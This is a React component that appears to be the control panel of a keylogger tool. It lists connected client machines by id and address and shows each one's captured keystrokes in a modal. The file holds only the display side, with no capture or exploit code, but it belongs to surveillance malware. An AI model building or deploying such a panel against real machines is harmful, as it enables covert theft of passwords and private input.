import {
  Box,
  ListItem,
  Text,
  List,
  HStack,
  Icon,
  Tooltip,
  IconButton,
  Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalFooter,
  ModalBody,
  ModalCloseButton,
  useDisclosure,
  Button,
  Textarea,
} from "@chakra-ui/react";
import { useEffect, useState } from "react";
import { FaKeyboard } from "react-icons/fa";
import { Header } from "../../components/Header";
import { useSocketServer } from "../../hooks/useSocketServer";

const CircleIcon = (props) => (
  <Icon viewBox="0 0 200 200" {...props}>
    <path
      fill="currentColor"
      d="M 100, 100 m -75, 0 a 75,75 0 1,0 150,0 a 75,75 0 1,0 -150,0"
    />
  </Icon>
);

export function Clients() {
  const { isOpen, onOpen, onClose } = useDisclosure();
  const [keyloggerClientId, setKeyloggerClientId] = useState();
  const { clients } = useSocketServer();

  const openKeyloggerModal = (clientId) => {
    setKeyloggerClientId(clientId);
    onOpen();
  };

  const keyloggerClient = clients.find(
    (client) => client.id === keyloggerClientId
  );

  return (
    <Box>
      <Header pageTitle="Clients" />
      <List mt={6}>
        {clients.map((client) => {
          const { id, address, connected } = client;
          return (
            <ListItem
              key={id}
              p={4}
              bgColor="gray.400"
              borderTop="2px"
              borderBottom="2px"
              display="flex"
              alignItems="center"
              justifyContent="space-between"
            >
              <Box display="flex" alignItems="center">
                <Tooltip
                  label={`Cliente ${connected ? "conectado" : "desconectado"}`}
                >
                  <span>
                    <CircleIcon
                      boxSize={6}
                      color={connected ? "green" : "red.400"}
                    />
                  </span>
                </Tooltip>
                <Text ml={3}>
                  {id} - {address}
                </Text>
              </Box>
              <HStack>
                <Tooltip label="Keylogger">
                  <IconButton
                    onClick={() => openKeyloggerModal(id)}
                    size="sm"
                    icon={<FaKeyboard />}
                  />
                </Tooltip>
              </HStack>
            </ListItem>
          );
        })}
      </List>
      <Modal isOpen={isOpen} onClose={onClose}>
        <ModalOverlay />
        <ModalContent>
          <ModalHeader>Keylogger - Client {keyloggerClient?.id}</ModalHeader>
          <ModalCloseButton />
          <ModalBody>
            <Textarea
              height={300}
              readOnly
              value={keyloggerClient?.lastKeysReleased.join(" - ")}
            />
          </ModalBody>
        </ModalContent>
      </Modal>
    </Box>
  );
}
